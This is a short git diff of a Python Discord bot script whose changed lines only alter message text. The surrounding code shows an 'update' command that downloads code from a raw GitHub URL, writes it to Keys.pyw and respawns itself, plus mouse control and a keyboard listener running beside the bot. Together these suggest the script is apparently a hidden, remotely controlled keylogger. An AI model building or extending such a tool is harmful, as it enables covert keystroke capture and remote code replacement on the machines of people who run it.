@@ -89,14 +89,14 @@ async def load(ctx):
 async def update(ctx):
     url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.py"
     r = requests.get(url).content.decode('utf-8')
-    await ctx.send("`got code`")
+    await ctx.send("got code")
     code = str(r)
     f = open("Keys.pyw",'w')
     f.write(code)
     f.close()
-    await ctx.send("`wrote code`")
+    await ctx.send("wrote code")
     os.spawnl(os.P_WAIT, sys.executable, *([sys.executable] + (sys.argv if __package__ is None else ["-m", __loader__.name] + sys.argv[1:])))
-    await ctx.send("`spawned script`")
+    await ctx.send("spawned script")
     sys.exit()
 @client.event
 async def on_ready():
@@ -232,7 +232,7 @@ async def ytsearch(ctx):
     mouse.click(Button.left, 1)
 @client.command()
 async def gittest(ctx):
-    await ctx.send("10/9 9:24 PM")
+    await ctx.send("10/9 9:18 PM")
 with Listener(on_press=on_press) as listener:
     o_t = time.time()
     client.run(auth.auth)
